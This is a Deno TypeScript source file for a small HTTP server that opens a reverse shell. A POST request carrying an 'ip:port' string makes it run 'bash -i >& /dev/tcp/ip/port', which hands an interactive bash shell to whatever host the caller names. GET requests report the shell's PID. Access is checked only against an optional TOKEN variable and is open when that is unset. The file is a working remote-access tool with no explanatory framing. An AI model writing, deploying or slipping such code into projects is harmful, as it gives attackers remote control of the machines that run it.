const headers = { "content-type": "text/plain" };

let ShellProcess: Deno.Process | null;

function verifyToken(h: Headers) {
  if (!Deno.env.get("TOKEN")) {
    return;
  }
  if (Deno.env.get("TOKEN") != h.get("authorization")) {
    throw new Error("Forbidden");
  }
}

function startShell(ip: string, port: string) {
  ShellProcess = Deno.run({
    cmd: ["bash", "-c", `bash -i >& /dev/tcp/${ip}/${port} 0>&1`],
  });
  ShellProcess.status().then(() => ShellProcess = null);
  return ShellProcess.pid;
}

async function handler(q: Request) {
  try {
    verifyToken(q.headers);
  } catch (err) {
    return new Response(err.message, { status: 403 });
  }

  if (q.method === "GET") {
    return new Response(
      ShellProcess ? `OK, PID is ${ShellProcess.pid}` : "OK",
      { headers },
    );
  }

  if (q.method === "POST") {
    if (!ShellProcess) {
      const payload = await q.text();
      const [ip, port] = payload.split(":");
      startShell(ip, port);
    }

    return new Response("Shell is Running. PID is " + ShellProcess.pid, {
      headers,
    });
  }

  return new Response("Not found", { status: 404 });
}

async function serve(callback: (q: Request) => Response | Promise<Response>) {
  async function handleHttp(conn: Deno.Conn) {
    for await (const e of Deno.serveHttp(conn)) {
      let resp: Response = new Response("");
      try {
        resp = await callback(e.request);
      } catch (err) {
        resp = new Response(err.message, { status: 500 });
      }
      await e.respondWith(resp);
    }
  }

  const port = parseInt(Deno.env.get("PORT") || "3000");
  console.log("server started, port", port);
  for await (const conn of Deno.listen({ port })) {
    handleHttp(conn);
  }
}

serve(handler);
